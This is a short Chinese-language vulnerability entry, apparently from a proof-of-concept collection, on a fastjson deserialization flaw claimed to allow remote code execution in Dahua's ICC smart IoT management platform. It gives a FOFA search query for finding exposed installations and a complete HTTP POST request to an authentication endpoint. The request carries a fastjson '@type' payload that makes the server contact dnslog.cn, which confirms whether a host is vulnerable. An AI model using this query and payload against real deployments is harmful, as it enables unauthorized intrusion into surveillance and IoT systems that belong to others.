## 大华ICC智能物联综合管理平台存在fastjson漏洞

大华ICC智能物联综合管理平台是专门为大华股份研发的一款物联网管理平台，它可以对多个智能设备和系统进行统一管理和控制，方便用户实时了解和管理各个设备和系统的状态。该平台提供了一系列的智能化功能，包括设备管理、监控预警、数据分析等，旨在为用户提供更加智能、高效和便捷的物联网管理体验，其使用了alibaba fastjson，存在反序列化漏洞导致RCE。

## fofa
```
body="*客户端会小于800*"
```

## poc
```
POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 144

{
    "a":{
        "@type":"com.alibaba.fastjson.JSONObject",
        {"@type":"java.net.URL","val":"http://dnslog.cn"}
        }""
}
```
